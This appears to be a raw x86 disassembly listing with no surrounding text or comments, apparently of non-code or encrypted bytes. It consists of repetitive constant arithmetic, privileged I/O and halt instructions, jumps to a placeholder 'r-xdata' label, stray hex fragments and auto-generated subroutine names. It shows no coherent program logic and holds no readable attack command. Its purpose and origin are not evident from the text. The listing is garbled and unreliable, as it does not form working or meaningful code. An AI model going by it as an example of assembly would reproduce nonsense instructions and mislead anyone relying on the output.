and [ ebx + 0x6a ] ah
push 0x5
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xd0180505
inc ebp
lds ebp [ edx - 0x20 ]
dec ecx
push 0xffffffe0
jns r-xdata
jpo r-xdata
cmpsb [ esi ] [ edi ]
push ebp
sbb al 0xc8
jne r-xdata
jns r-xdata
dec esi
push 0x6a
add eax 0x5050505
int 0xf3
sbb al 0xd0
push 0x5
add eax 0x5050505
add eax 0x9a050505
adc bl dl
jg r-xdata
add eax 0x6a4c147c
push 0x5
add eax 0x5050505
add eax 0x16c40505
enter 0xf361 0xae
add eax 0x6a6d1605
0x541e5400 0xcbca
into
pop esp
push esi
add eax 0x7cbe6f16
sbb [ esi + 0x5059595 ] al
rcr [ esi ] 0x79
push 0x5
jl r-xdata
jl r-xdata
sub bl [ esi + 0x1ec29595 ]
insd
jl r-xdata
jns r-xdata
or eax 0x595959d
push ds
push 0x7c
push 0x6a
add eax 0x5050505
add eax 0xc4050505
push edi
int 0x7c
sbb [ edx + 0x6a ] bh
push 0x5
add eax 0x5050505
add eax 0xb0ff0505
jl r-xdata
imul esp [ esi - 0x62f283ab ] 0x1e059595
add eax 0xcd050505
sbb al 0xd0
mov ebp 0x5059595
add eax 0x5050505
push ss
insd
push 0xffffff9a
add [ esi + ebx + 0x54 ] dl
0xcecb
mov dh 0x95
xchg ebp eax
add eax 0x5566d44
jl r-xdata
rcl [ ebx - 0x7b20e966 ] cl
xchg ebp eax
xchg ebp eax
push ds
rol [ ebp + 0x7c ] 0x1
dec edi
mov edi 0x5059595
add eax 0x5050505
add eax 0x4c147c05
mov ecx 0x5059595
add eax 0xb1d15305
adc [ ebp + edi * 2 + 0x6a6a4cf9 ] 0x790b7ccc
push 0x6a
add eax 0x95bdc97c
xchg ebp eax
add eax 0x1c55a605
enter 0x1c75 0xc8
popad
[ edi ]
push ss
mov al 0x95
xchg ebp eax
add eax 0x6a166c1e
xchg esp eax
0x6a402e10 0x7c6a
fiadd [ ebp + 0x5059595 ]
sbb al 0xe8
insd
jl r-xdata
retn
cdq
cmp [ eax + edx - 0x47 ] 0xffffff95
xchg ebp eax
add eax 0xde7dd052
inc eax
push 0x6a
add eax 0xc5050505
push ss
jns r-xdata
add eax 0x791ec005
push 0xcf056a6a
jmp edi
sub_48f71f
push 0x5056a6a
add eax 0x7ce7ffca
rol [ eax + 0x6a ] 0x1
push 0x5
add eax 0xc6c50505
jl r-xdata
jl r-xdata
inc esp
push 0x6a
add eax 0xc4791e05
jl r-xdata
insd
jl r-xdata
popfd
xchg ebp eax
xchg ebp eax
add eax 0x2a7c791e
sahf
xchg ebp eax
xchg ebp eax
retn 0x6d1e
push 0x5
jl r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
jmp eax
jl r-xdata
mov ecx 0x5059595
add eax 0xb1d15305
adc [ ebp + edi * 2 + 0x6a6a4cf9 ] 0x790b7ccc
push 0x6a
add eax 0x95bdc97c
xchg ebp eax
add eax 0x1c55a605
enter 0x1c75 0xc8
popad
[ edi ]
add eax 0xcd050505
sbb al 0xd0
imul esp [ esi - 0x62f283ab ] 0x1e059595
jns r-xdata
mov ebp 0x5059595
cmpsb [ esi ] [ edi ]
push ebp
sbb al 0xc8
jne r-xdata
cdq
cmp [ eax + edx - 0x47 ] 0xffffff95
xchg ebp eax
add eax 0xde7dd052
retn
inc eax
push 0x6a
add eax 0xc5050505
jl r-xdata
sub bl [ esi + 0x1ec29595 ]
add eax 0x6a4c147c
push 0x5
add eax 0x5050505
add eax 0x16c40505
rcl [ ebx - 0x7b20e966 ] cl
xchg ebp eax
xchg ebp eax
push ds
rol [ ebp + 0x7c ] 0x1
dec edi
mov edi 0x5059595
add eax 0x5050505
add eax 0x4c147c05
push 0x6a
add eax 0x5050505
add eax 0xc4050505
push ss
enter 0xf361 0xae
add eax 0x5050505
push ss
insd
push 0xffffff9a
add [ esi + ebx + 0x54 ] dl
0xcecb
mov dh 0x95
xchg ebp eax
add eax 0x5566d44
sub_48f858
mov ebp 0x54169595
xchg edi eax
jl r-xdata
test ebp 0x6dd01cf3
jl r-xdata
js r-xdata
inc eax
test [ ebp + 0x5050595 ] edx
add eax 0x6fb87c05
push 0x6a
add eax 0x6310f305
jl r-xdata
mov ebp 0x943e109a
push 0x5
add eax 0x5050505
add eax 0xeeacd205
push 0x5
add eax 0x167c0505
outsd
push 0x6a
add eax 0x5050505
int 0xf3
sbb al 0xd0
arpl di di
add eax 0x5050505
add eax 0xacd20505
out dx al
push 0x6a
adc [ ebp - 0x66 ] dl
adc [ edx ] bl
inc ebx
push 0x6a
jge r-xdata
adc [ ebp + 0x1e050595 ] 0xffffffc0
cdq
jl r-xdata
xchg ebp eax
xchg ebp eax
mov al 0x95
xchg ebp eax
jl r-xdata
jl r-xdata
push 0x6a
inc edi
push 0x6a
add eax 0x5050505
push ds
mov esi 0x60f47c5a
push 0x6a
add eax 0xfa7ccd05
mov bh 0x95
xchg ebp eax
0x541e540c 0x27c
mov [ ebp + 0x48807d95 ] dl
push 0x6a
cmpsb [ esi ] [ edi ]
push ebp
aad 0x7c
mov ch 0x40
xchg ebp eax
xchg ebp eax
jge r-xdata
xchg esp eax
inc ebx
push 0x6a
add eax 0x6a61e06a
retn 0x7ce1
push ss
mov al 0x95
xchg ebp eax
add eax 0x6a166c1e
xchg esp eax
0x6a402e10 0x7c6a
fiadd [ ebp + 0x5059595 ]
sbb al 0xe8
insd
jl r-xdata
add eax 0x791ec005
push ss
jns r-xdata
push 0xcf056a6a
jmp edi
push 0x6a
add eax 0x5050505
add eax 0xc4050505
push edi
int 0x7c
sbb [ edx + 0x6a ] bh
push 0x5
add eax 0x5050505
add eax 0xb0ff0505
sub_48fc3c
push ds
dec esp
sbb al 0xc8
mov bl 0x1e
dec ebp
sbb al 0xc8
mov ebp 0x6a6a987c
push 0x5
jl r-xdata
insd
jl r-xdata
pushfd
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x577c0505
inc esi
push 0x6a
add eax 0x5050505
int 0xff
int1
sbb al 0xd0
jae r-xdata
mov bh 0xcd
nop
xchg ebp eax
xchg ebp eax
add eax 0x55a6d5ff
jmp edi
push eax
sbb al 0xd0
jge r-xdata
sbb [ 0x7d6a6a68 ] ah
neg [ ebx + 0x6a ]
push 0x18
call 0x774b7a61
push 0x6a
adc [ ebp - 0x66 ] dl
adc [ ecx + eax * 4 - 0x6b ] dh
xchg ebp eax
sbb al ch
dec ebp
mov esp 0x56a6a6b
add eax 0x5050505
add eax 0x5050505
add eax 0x7c050505
outsb
mov edx [ ebp + 0x5050595 ]
add eax 0x7c6aa605
mov eax 0xc66a6a66
sbb [ eax ] dl
adc eax 0x7c6a6a68
push esi
jpo r-xdata
push ss
push ecx
cdq
inc [ ebp - 0x564e2ee8 ]
retn 0xc77c
push 0x64be6a6a
adc [ edi + 0x7c ] eax
cmp bl [ ecx + 0x5059595 ]
retn 0xe16a
sbb [ eax ] bl
and eax 0x7d6a6a68
adc al 0x77
push 0x6a
jl r-xdata
push 0x5
add eax 0xc363a605
push 0xffffffc2
fnstcw [ edx + edx * 2 - 0x64 ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x74057d05
push 0x6a
std
in al 0xc3
and eax 0xb87cc6a5
pop edx
push 0x6a
add eax 0x18050505
adc cl dh
push 0x6a
push 0xffffffc3
lds edi [ ebp - 0x6e ]
sahf
xchg ebp eax
xchg ebp eax
inc [ ebp + 0x6a72627c ]
push 0x5
add eax 0x63117ccd
push 0x6a
0x6a6d4511 0x186a
sub_48fd48
pushfd
jmp esi
jns r-xdata
xchg ebp eax
xchg ebp eax
add eax 0x1e050505
jns r-xdata
mov bl 0xc2
push esp
jl r-xdata
dec ebp
push 0x6a
add eax 0x8d791405
xchg esi eax
xchg ebp eax
xchg ebp eax
mov bl 0xa6
dec esi
retn 0x6d1e
mov ah 0x95
xchg ebp eax
rcr [ esi ] 0x79
adc al 0x79
lds edx [ edi - 0x3d6a6b ]
out 0xcc al
push esp
push ds
push esp
sbb al 0xd0
dec ebp
int 0xff
clc
jl r-xdata
lds ebx [ eax ]
adc cl al
outsb
push 0x6a
lds edi [ ebp + esi * 8 - 0x6f ]
xchg ebp eax
xchg ebp eax
add eax 0xc26c6205
jpo r-xdata
add eax 0xf34ea605
sbb al 0xc8
iretd
push 0x5
add eax 0xe06a0505
popfd
sbb al dl
inc ecx
sub_48fd98
push 0xffffffe1
mov cl 0x8d
jl r-xdata
add eax 0xf34ea605
sbb al 0xc8
iretd
pop esi
push 0x6a
add eax 0xf0e166fd
mov dl 0x1c
ror ebp cl
jge r-xdata
retn 0x91ff
jne r-xdata
add eax 0x5050505
push 0x7c
xchg ebx eax
jl r-xdata
add eax 0x6affc505
push 0xffffffe0
sbb al 0xc8
pop ebp
retn 0xc47c
push 0xffffffc0
push ds
jns r-xdata
add eax 0x6a050505
loopne r-xdata
call [ ecx - 0x6a5a6a03 ]
xchg ebp eax
jl r-xdata
adc [ edi + 0x7c ] eax
cmp bl [ ecx + 0x5059595 ]
retn 0xe16a
sbb al dl
inc ecx
lds ebx [ eax ]
adc cl al
outsb
push 0x6a
lds edi [ ebp + esi * 8 - 0x6f ]
xchg ebp eax
xchg ebp eax
add eax 0xc26c6205
dec [ ebp + 0x6a ]
push 0x5
add eax 0x968d7914
xchg ebp eax
xchg ebp eax
mov bl 0xa6
dec esi
retn 0x6d1e
dec ebp
push 0x6a
add eax 0x8d791405
xchg esi eax
sub_48fdd4
sbb [ eax ] dl
jns r-xdata
shr [ ebp - 0x43 ] 0x1
jl r-xdata
push 0x6a
jl r-xdata
enter 0xce3d 0xf3
sbb al 0xc8
aas
jl r-xdata
dec ebp
push 0x6a
add eax 0xd8180505
imul edi [ eax + ebp + 0x4b ] 0x5056a6a
push ds
shl [ ecx + 0x689c7c91 ] 0x1
push 0x6a
add eax 0xf3cef8ff
sbb al 0xc8
xchg ebp eax
push 0x6a
add eax 0x5050505
add eax 0xf34ea605
sbb al 0xc8
iretd
enter 0x7ccf 0x9d
test [ ebp - 0x1900fa6b ] edx
push ds
dec esp
sbb al 0xc8
aaa
push ds
dec edi
sbb al 0xc8
xor esi ecx
jmp ecx
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0xffc50505
push 0x6a
loopne r-xdata
sbb al 0xc0
sub ecx edi
sbb al 0xc8
pop ebp
retn 0xc47c
sub_48ff0b
push ebp
jl r-xdata
and [ edx + ebp * 2 + 0x6a ] ch
iretd
pop ecx
push 0x6a
add eax 0x5050505
pop ebp
in eax 0xe7
stc
mov ch 0x52
rcr [ ecx - 0x3 ] 0x1
in al dx
in eax 0xf0
push edx
rol [ ebp - 0x19 ] 0x1
jecxz r-xdata
mov edx [ ebp - 0x2fadfa6b ]
push ebp
sti
retn
mov cl 0x89
lodsb [ esi ]
salc
lea ebx [ edx - 0x6a6a3bed ]
xchg ebp eax
push ss
int1
mov cl 0x85
xchg ebp eax
sbb cl dl
mov cl 0x85
lds ebx [ edx - 0x3a0e29de ]
push ds
salc
mov ebx 0xb1d196f3
mov cl 0x9a
and dl [ ebp - 0x3b ]
jl r-xdata
lea ebx [ ecx + edx * 8 ]
mov ch 0x7d
jns r-xdata
add eax 0x5050505
push 0x3
cmp [ ebp + 0x257d9595 ] edx
pop esi
push 0x6a
push ss
insd
xchg esp eax
0x6a425311 0xa66a
push ebp
sbb al 0xd1
mov cl 0x8d
sbb al 0xd1
xchg ebp eax
xchg ebp eax
0xcecb
sub_48ff69
fcomp st0
push edx
rcr [ ebp - 0x1b ] 0x1
out 0xf9 eax
lea ebx [ ecx + edx * 8 ]
mov ch 0x7d
jns r-xdata
mov ch 0x52
rcr [ ecx - 0x3 ] 0x1
in al dx
in eax 0xf0
push edx
rol [ ebp - 0x19 ] 0x1
jecxz r-xdata
pop ebp
in eax 0xe7
stc
mov edx [ ebp - 0x2fadfa6b ]
push ebp
sti
retn
mov cl 0x89
lodsb [ esi ]
salc
lea ebx [ edx - 0x6a6a3bed ]
xchg ebp eax
push ss
int1
mov cl 0x85
xchg ebp eax
sbb cl dl
mov cl 0x85
lds ebx [ edx - 0x3a0e29de ]
push ds
salc
mov ebx 0xb1d196f3
mov cl 0x9a
and dl [ ebp - 0x3b ]
jl r-xdata
add eax 0x5050505
push 0x3
cmp [ ebp + 0x257d9595 ] edx
pop esi
push 0x6a
push ss
insd
xchg esp eax
0x6a425311 0xa66a
push ebp
sbb al 0xd1
mov cl 0x8d
sbb al 0xd1
xchg ebp eax
xchg ebp eax
0xcecb
sub_48ffb3
std
xchg ecx eax
xchg esp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
jl r-xdata
fwait
xchg ebp eax
xchg ebp eax
add eax 0x119a0505
mov esi 0xfd6a6a4e
mov bh 0x97
sub bl [ edi ]
retn 0xe87d
add eax 0x791ec005
push ds
popfd
xchg ebp eax
xchg ebp eax
add eax 0x9e119a05
push 0xa87c6a6a
push 0x6a
add eax 0xc0050505
push ds
jns r-xdata
jl r-xdata
rcr [ ebp - 0x68e286ec ] 0x1
xchg ebp eax
xchg ebp eax
sub al 0xd8
iretd
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
mov ch 0x95
xchg ebp eax
add eax 0x9a050505
adc [ ecx + 0x1c959595 ] edx
jmp 0x7e0c8205
add eax 0x2d050505
xchg ebp eax
xchg ebp eax
xchg ebp eax
xchg ebp eax
0x69c81c37 0xdb7c
pop esp
push 0x6a
add eax 0x1e050505
push edx
jl r-xdata
inc edi
push 0x6a
add eax 0x5050505
add eax 0x7c050505
dec ebp
arpl [ edx + 0x6a ] bp
add eax 0x5050505
add eax 0x565c0505
jl r-xdata
bound ebp [ edx + 0x6a ]
adc [ ebp - 0x66 ] dl
adc [ 0xffffffffff6a6a43 ] dh
leave
int 0xf3
sbb al 0xd0
test [ edx + edi * 4 - 0x75 ] edi
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x7c050505
cli
xchg [ ebp + 0x5050595 ] dl
add eax 0x94ff0505
jl r-xdata
retn
popad
push 0x6a
0x927c8422 0x9586
xchg ebp eax
add eax 0x39791405
xchg ecx eax
xchg ebp eax
xchg ebp eax
retn
push 0x6a
dec esi
push 0x6a
add eax 0xffc30505
shl [ esi + 0x1dd0184e ] 0x1
mov ch 0x7c
hlt
sub_4902de
inc esp
push 0x6a
add eax 0x541ec3c6
and edx [ ebx - 0x6a7b0384 ]
xchg ebp eax
jl r-xdata
test [ ebp + 0x4eea7c95 ] dl
cli
adc [ ebp + 0x5050595 ] 0x239a0505
xchg ebx eax
jl r-xdata
adc [ edi + 0x7c ] al
push 0x6a
add eax 0x10815116
push ebp
jl r-xdata
dec esi
adc [ edi + 0x7c ] al
dec esi
push 0x6a
push ss
insd
push 0xffffff9a
adc [ eax * 2 - 0x6b009596 ] al
sbb cl dl
mov cl 0xba
jl r-xdata
xchg ebp eax
push ss
push ecx
cdq
sbb [ eax ] dl
jns r-xdata
pop edi
push 0x6a
add eax 0x5050505
add eax 0x1ec4c405
rcr [ ebp + 0x6a72707c ] 0x1
push 0xffffff9a
adc [ edx + 0x7c6a6a59 ] edx
0x6a41
insd
push 0x6a
add eax 0x5050505
jge r-xdata
push 0x6a
jl r-xdata
je r-xdata
push eax
push 0x6a
int3
add eax 0x5050505
add eax 0xf3050505
sbb al 0xc0
loopne r-xdata
push 0x5
add eax 0x8921119a
xchg ebp eax
xchg ebp eax
jl r-xdata
add eax 0x5050505
add eax 0x1cf30505
shl [ ebx - 0xd ] 0x1c
fsub [ ebp + 0x7d ]
sbb al 0xd8
jge r-xdata
push 0x5
add eax 0xe81cf305
sub [ esi ] ebx
jl r-xdata
jae r-xdata
and [ ecx - 0x5836a6b ] ecx
dec esp
push 0x6a
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
xchg ebp eax
xchg ebp eax
call ecx
jl r-xdata
retn 0x10d9
xchg esi eax
push 0x6a
int 0xff
hlt
dec edi
jle r-xdata
pop eax
push 0x6a
add eax 0x61e81cf3
push ds
imul esi ebx 0x1c
call 0xfffffffff3b62298
sbb al 0xe8
insd
inc ebx
jl r-xdata
add eax 0x68191818
push 0x6a
jge r-xdata
sbb al 0xd0
jg r-xdata
dec esp
push ds
push ecx
push 0x6a
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xc01cf305
pop edi
push 0x6a
int3
add eax 0x5050505
add eax 0x7dc81cf3
push ds
push edx
sbb al 0xd0
jns r-xdata
jl r-xdata
sbb al 0xc8
jl r-xdata
jge r-xdata
imul esi ebx 0x1c
call 0x7cb722cf
inc edi
xchg [ ebp + 0x5050595 ] dl
add eax 0xf3050505
push 0x5056a6a
add eax 0x29e81cf3
push ds
sbb al 0xc8
push eax
sbb al 0xd0
jpo r-xdata
loope r-xdata
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x50556cc
retn
sbb al 0xc8
jpo r-xdata
enter 0x1e79 0x4c
jl r-xdata
add eax 0x5050505
add eax 0xb1f11605
mov cl 0x95
sbb cl dl
mov cl 0xb1
jl r-xdata
push 0x6a
add eax 0x5050505
0x14c59223 0x5f52
sbb al 0xc8
jns r-xdata
enter 0x1e7d 0x4f
arpl [ edx + 0x6a ] bp
add eax 0x10180505
cmp [ ebx + 0x6a ] esp
push 0x7c
test al 0x7b
push 0x6a
add eax 0x56cb0505
add eax 0xd01e0505
imul edi [ eax + eax * 2 + 0x4f ] 0x5056a6a
add eax 0x81d81e05
jge r-xdata
xchg ebp eax
xchg ebp eax
xchg ebp eax
0x95877811 0x7c95
xchg esi eax
push 0xb2fd6a6a
aam 0xfd
into
jl r-xdata
add eax 0x7c050505
pop eax
push 0x6a
sbb al 0xd0
jge r-xdata
add eax 0x7bd81cf3
sbb al dl
push ebp
cmpsb [ esi ] [ edi ]
inc ebp
push 0x6a
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
add eax 0x6a45e17c
push 0x5
add eax 0x9a050505
and edx [ edx + 0x5f5214c5 ]
pop edi
push 0x6a
add eax 0x5050505
add eax 0x9a050505
adc [ ecx - 0x29595b9 ] edi
xchg ebp eax
test [ ebp + 0x71887c95 ] edx
push 0x6a
push 0xffffffc2
mov ebp edi
xchg ebp eax
adc eax 0x7cc69595
mov ah [ esi + 0x6a ]
push 0xffffffc5
jl r-xdata
add eax 0x5050505
push 0xffffffd8
cdq
jl r-xdata
pop esp
jl r-xdata
shl [ ecx + 0x7c ] 0x1
mov bh 0x50
push 0x6a
add eax 0x5050505
add eax 0x1cf30505
fdivr [ ebx + 0x18 ]
rcl [ ebp - 0x5a ] 0x1
jl r-xdata
push 0x6a
push 0x5
push ss
push ecx
mov ch 0xc6
mov dh 0x18
adc [ ecx ] ch
outsd
push 0x6a
lds edi [ esp + edx * 4 + 0x45 ]
push 0x6a
add eax 0x81511605
jl r-xdata
mov [ ebp - 0x67ef656b ] dl
inc ebx
push 0x6a
0xb27c
xchg edi eax
xchg ebp eax
shr [ ecx + 0x7c ] 0x1
inc eax
dec edi
push 0x6a
add eax 0x1e050505
fadd [ ecx + 0x6a45547d ]
push 0x18
rol [ ebp - 0x6a6c023b ] 0x1
dec eax
push 0x6a
sbb al dl
test ebp eax
std
xchg ebx eax
xchg ebp eax
push 0x6a
push 0x5
add eax 0xe17c0505
inc ebp
stosd [ edi ]
lahf
xchg ebp eax
xchg ebp eax
add eax 0x7cc3841f
imul edx [ edx + 0x6a ] 0x6a
adc [ ebp - 0x66 ] dl
adc [ eax ] ecx
xchg [ ebp - 0x3348006b ] dl
jl r-xdata
xchg esp eax
xchg ebp eax
xchg ebp eax
push ss
push ecx
cdq
lodsb [ esi ]
jmp 0x11e3bc5d
push 0x6a
add eax 0x5050505
add eax 0xd0180505
pop ecx
sbb al 0xe0
cmp [ ebp + edx * 2 + 0x7c ] edi
push 0x6a
lds edi [ ebp - 0x55 ]
push 0x6a
sub_4905e9
push 0x5
add eax 0x5050505
add eax 0x7b85119a
push 0x6a
jl r-xdata
pop ecx
xchg ebp eax
jpe r-xdata
push 0x16
dec esi
push 0x6a
push ss
push ecx
cmp [ ebx + ebp * 2 + 0x56 ] 0xfd056a6a
js r-xdata
push 0x5
add eax 0x7c815116
xor bl [ edi + 0x1f059595 ]
test bl al
jl r-xdata
xchg ebp eax
xchg ebp eax
jge r-xdata
push 0x5
push ss
push ecx
cdq
push 0x2
cmp eax 0xae959595
stosd [ edi ]
lahf
xchg ebp eax
xchg ebp eax
add eax 0x7cc3841f
imul edx [ edx + 0x6a ] 0x6a
inc ebx
push 0x6a
0xb27c
xchg ebx eax
jpo r-xdata
push ds
push ebx
jl r-xdata
adc [ ebp - 0x66 ] dl
adc [ eax ] ecx
xchg [ ebp - 0x3348006b ] dl
jl r-xdata
push edx
push 0x6a
xchg esp eax
xchg ebp eax
push 0x6a
add eax 0x5050505
add eax 0xd0180505
push 0x6a
push esi
0x6a6e0711 0x7c6a
push ecx
dec esi
push 0x6a
add eax 0x1c9dd51e
shr [ ecx + 0x1e ] 0x1
shr [ ecx + 0x5c ] 0x1
push esi
add eax 0x6a050505
and bl [ ecx - 0x6b ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
scasb [ edi ]
jl r-xdata
xchg ebp eax
push ss
push ecx
cdq
lodsb [ esi ]
jmp 0x11e3bc5d
mov [ ebp + 0x5050595 ] ss
add eax 0x47d01cf3
jl r-xdata
push ecx
mov ch 0xc6
mov dh 0x18
adc [ ecx ] ch
outsd
push 0x6a
lds edi [ esp + edx * 4 + 0x45 ]
push 0x6a
add eax 0x81511605
jl r-xdata
push esi
push 0x6a
add eax 0x6aff8aff
sbb al 0xe8
imul edi [ ecx + 0x40 ] 0x1f7d6a6a
pop edi
push 0x6a
push ss
jl r-xdata
dec ebp
push 0x6a
add eax 0x6aa60505
jl r-xdata
xchg ebp eax
sbb [ ecx ] dl
mov cl 0xd
xchg ebp eax
xchg ebp eax
xchg ebp eax
retn 0x7cc5
lea edx [ ebp - 0x5000fa6b ]
int 0xff
iretd
pop ecx
sbb al 0xe0
cmp [ ebp + edx * 2 + 0x7c ] edi
push 0x6a
lds edi [ ebp - 0x55 ]
add eax 0x5050505
sbb al dl
dec eax
push 0x6a
push ds
shr [ ebp + 0x7c ] 0x1
les ebp [ ebx + 0x6a ]
push 0x5
add eax 0x5050505
pop esp
push esi
add eax 0x7c975416
0x9591
sub_490a00
push esi
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xc0050505
jl r-xdata
jl r-xdata
push ecx
cdq
jl r-xdata
dec edx
push 0x6a
add eax 0x5050505
add eax 0x3f119a05
push esi
push 0x6a
push ds
pop ebx
push esp
je r-xdata
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x6a69d81e
in al 0x69
push ds
xchg esp eax
push ds
fsubr [ ebp - 0x6a ]
fsub [ ecx + 0x7c ]
rol [ ebp + edx * 4 + 0x5050595 ] 0x1
add eax 0x7dc50505
cmp al 0x68
push 0x6a
push ss
push ecx
cdq
jl r-xdata
jl r-xdata
test [ ebp - 0x393dfa6b ] dl
jl r-xdata
dec esp
push 0x6a
0x6a5eef1b 0x1e6a
sub eax 0x95959555
push ds
fnstenv [ ecx + 0x7d421e85 ]
mov [ ebp + 0x55109595 ] ss
0x6a569311 0xd66a
adc al 0x52
adc [ ebp + 0x417c9595 ] edx
outsd
push 0x6a
add eax 0x5050505
jl r-xdata
ror [ ecx - 0x3b ] 0x1
push ds
push ebx
jge r-xdata
dec edi
push 0x6a
add eax 0x5050505
sbb al dl
dec ecx
lds ebx [ esi ]
lds edi [ esp + ebp * 8 + 0x5c ]
inc ebp
push 0x6a
push 0xffffffe0
cdq
jl r-xdata
lahf
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x5050505
lds edi [ ebx + esi + 0x6e ]
push 0x6a
iretd
jne r-xdata
add eax 0x5050505
add eax 0xa1d3ae05
0x6a7d6510 0x7c6a
dec eax
cwde
xchg ebp eax
xchg ebp eax
add eax 0x7c050505
hlt
sub ch [ edx + 0x6a ]
int3
add eax 0x18050505
push 0x1e
shl [ ecx - 0x49605603 ] cl
int 0x7c
mov ebp 0x5959593
add eax 0x5050505
add eax 0x211018c5
insd
push 0x6a
lds ebx [ eax ]
sar [ ecx - 0x3b ] 0x1
jl r-xdata
mov eax [ 0xffffffffb69fa9fd ]
adc [ ebp + 0x5050595 ] 0x5
jmp esi
mov ecx 0x1e959580
rol [ ebp - 0x3c3972e4 ] 0x1
push ds
push edx
jge r-xdata
push 0x5
add eax 0x5050505
add eax 0x7c791ec0
mov al [ 0x5959587 ]
cmpsb [ esi ] [ edi ]
push ebp

push 0x5
add eax 0x5050505
add eax 0xff050505
push 0x7c
0x56a6a52 0x55fe
inc ebx
push 0x6a
add eax 0xc555229a
push ds
push ebx
jge r-xdata
push 0x5
add eax 0x5050505
sbb al dl
push ecx
push edx
shl [ ecx - 0x22 ] 0x1
retn
bound ebp [ edx + 0x6a ]
int3
ja r-xdata
dec esi
push 0x6a
push ss
sub eax 0x5959584
retn 0x7cc6
push 0x5
add eax 0x4d2d179a
push 0x6a
sbb al dl
jne r-xdata
cmovo ebp [ edx + 0x6a ]
jl r-xdata
jl r-xdata
pop ss
sub eax 0x186a6a4d
shl [ ebp - 0x3b ] 0x1
push ecx
push 0x6a
add eax 0x5050505
add eax 0x5050505
[ edx + 0x7c ]
retn 0x567c
push 0x6a
add eax 0x5050505
add eax 0x7c6d1e05
pop ebx
push edi
push 0x6a
add eax 0x958f867c
xchg ebp eax
add eax 0x5050505
push ss
call 0x10e39d78
cmpsd [ esi ] [ edi ]
jle r-xdata
pop esp
sub_490b1b
push 0x6a
add eax 0x5050505
add eax 0x99511605
jl r-xdata
sbb al 0xd8
inc edi
int3
nop
xchg ebp eax
xchg ebp eax
0x6a512011 0xa66a
push 0xffffffc6
sar [ ebx + esi + 0x51 ] cl
push 0x6a
add eax 0x61d01c05
sbb al 0xd0
imul edi [ esp + edx * 8 + 0x60 ] 0x5056a6a
add eax 0x18050505
rcl [ ecx + 0x52 ] 0x1
shl [ ecx - 0x22 ] 0x1
retn
sub_490b74
push edi
push 0x6a
push ss
push edi
xchg edi eax
jl r-xdata
sbb al 0xc8
jl r-xdata
push edx
push 0x6a
add eax 0xd81cf305
inc edi
int3
adc [ eax + 0x7c6a6a56 ] bl
xchg ebx eax
adc [ ebp + 0x5050595 ] 0x91ff0505
sbb al dl
dec ecx
lds ebx [ esi ]
shr [ ebp + 0x7c ] 0x1
retn
xchg esp eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0xb1d1ac05
mov [ edx + 0x6a401d11 ] ebx
push 0xffffffc2
jl r-xdata
add eax 0x5050505
add eax 0x65131e05
xchg ebp eax
xchg ebp eax
xchg ebp eax
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x1e050505
adc esp [ ebp - 0x6b ]
sub_490bef
push 0xffffffcb
push ds
dec ebx
push edx
push ds
dec ebp
jl r-xdata
push ds
push 0x6a
retn
insb
push 0x6a
add eax 0xd555a605
jl r-xdata
sbb al 0xc8
jno r-xdata
popad
push 0x6a
add eax 0x7ce5ffc2
xchg [ esi + 0x6a ] edi
push 0x5
jl r-xdata
frstor [ eax + 0x6a ]
push 0x5
add eax 0x65c7139a
push esi
push 0x6a
add eax 0x5050505
add eax 0x9afd6c16
pop ss
adc [ esi + 0x6a ] 0x6a
adc [ edx - 0x66 ] ch
adc [ eax + 0x7c6a6a56 ] bl
xchg ebx eax
adc [ ebp + 0x5050595 ] 0x91ff0505
sbb al dl
dec ecx
lds ebx [ esi ]
shr [ ebp + 0x7c ] 0x1
retn
sub_490c47
push 0x5
add eax 0x5050505
add eax 0x564d6205
add eax 0x5050505
push 0x5
adc eax 0x7c959595
fnstenv [ edx + ebp * 2 + 0x6a ]
add eax 0x437c531e
push esp
push 0x6a
add eax 0x5050505
add eax 0x9a050505
adc [ eax + 0x166a6a6b ] ebx
push ebp
xchg edi eax
0x827ca522 0x9587
xchg ebp eax
add eax 0x99e81605
xchg ebp eax
jl r-xdata
ja r-xdata
adc [ 0xffffffffc56a6a68 ] dh
push 0x5
push ds
imul edi [ esp + ebx * 4 + 0x5a ] 0x6a
push 0xffffffa6
push ebp
push esi
add eax 0x5050505
add eax 0x99511605
jl r-xdata
add eax 0x61fd0505
xchg esp eax
xchg ebp eax
xchg ebp eax
push 0xffffffc2
popfd
push 0xffffffe1
mov cl 0x9d
push 0xffffffc2
mov ecx 0x26a95ff
cmp [ ebp + 0x567c9595 ] edx
adc [ ebp + 0x5050595 ] 0x5050505
add eax 0x112c30fd
add dl 0x7d
lea eax [ edx + ebp * 2 + 0x6a ]
lahf
xchg ebp eax
xchg ebp eax
jl r-xdata
push ss
push ecx
lea ebx [ eax ]
shl [ ebp - 0x3b ] 0x1
sbb al dl
cmp eax 0xffc6c6c5
mov ch 0xc6
mov dh 0xc6
sbb [ eax ] dl
xor eax 0xc56a6a68
dec ebx
push 0x6a
add eax 0x4e7c4d1e
push edi
push 0x6a
add eax 0x6a050505
loopne r-xdata
int3
jl r-xdata
mov dh 0xc6
adc [ ebp + 0x18e91e95 ] 0x71
cmpsb [ esi ] [ edi ]
arpl [ esi ] bx
pop ebx
push ds
dec edx
jl r-xdata
pop ebx
push 0x6a
jmp edx
sub_490f4f
push 0x5
into
jl r-xdata
bound ebp [ edx + 0x6a ]
add eax 0x5050505
add eax 0x35d01805
lds edi [ edx + esi * 2 + 0x69 ]
push 0x6a
add eax 0x5050505
add eax 0x5050505
cmpsb [ esi ] [ edi ]
inc edi
sbb al 0xd0
